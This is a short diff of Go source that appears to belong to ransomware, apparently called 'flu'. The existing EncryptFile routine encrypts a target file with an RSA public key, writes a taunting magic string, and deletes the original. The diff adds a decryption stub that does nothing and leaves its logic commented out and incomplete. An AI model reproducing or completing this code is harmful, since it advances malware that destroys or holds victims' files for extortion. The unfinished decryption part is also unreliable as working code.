@@ -111,13 +111,39 @@ func ImportPublicKey() (*rsa.PublicKey, error) {
     return pk, errors.WrapIfNotNil(pkg, "failed to import RSA public key", err)
 }
 
-// Encrypt a file.
+func DecryptFile(pk *rsa.PublicKey, path string) error {
+    // TODO
+    return nil
+    //err := decryptFile(pk, path)
+    //if err != nil {
+    //    return err
+    //}
+    //// remove original file
+    //return errors.WrapIfNotNil(pkg, "failed to remove file", os.Remove(path))
+}
+
+//func decryptFile(aesIVKey []byte, path string) error {
+//    fEncrypted, err := os.Create(path + ".flu")
+//    if err != nil {
+//        return errors.Wrap(pkg, "failed to create file", err)
+//    }
+//    defer fEncrypted.Close()
+//
+//    fOriginal, err := os.Open(path)
+//    if err != nil {
+//        return errors.Wrap(pkg, "failed to open file", err)
+//    }
+//    defer fOriginal.Close()
+//
+//    iv := aesIVKey[:16]
+//    key := aesIVKey[16:]
+//}
+
 func EncryptFile(pk *rsa.PublicKey, path string) error {
     err := encryptFile(pk, path)
     if err != nil {
         return err
     }
-
     // remove original file
     return errors.WrapIfNotNil(pkg, "failed to remove file", os.Remove(path))
 }
@@ -147,7 +173,7 @@ func encryptFile(pk *rsa.PublicKey, path string) error {
     w := bufio.NewWriter(fEncrypted)
 
     // write magic
-    _, err = io.WriteString(w, "JUSTA FLU BRO :)")
+    _, err = io.WriteString(w, magicBytes)
     if err != nil {
         return errors.Wrap(pkg, "failed to write magic", err)
     }
